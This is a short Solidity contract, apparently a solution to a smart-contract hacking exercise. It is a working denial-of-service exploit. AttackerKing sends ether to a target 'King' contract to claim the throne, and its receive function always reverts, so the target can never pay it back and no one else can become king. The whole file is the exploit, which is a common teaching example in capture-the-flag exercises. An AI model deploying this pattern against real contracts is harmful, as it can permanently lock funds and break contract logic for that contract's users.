// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract AttackerKing {
    constructor (address _king) public payable {
        // Send ether to the King contract
        (bool success, ) = _king.call{value: msg.value}("");
        require(success, "Failed to send ether to become king");
    }

    // Optional: Fallback function to Deny others to become king
    receive() external payable {
        revert("You Lose!");
    }
}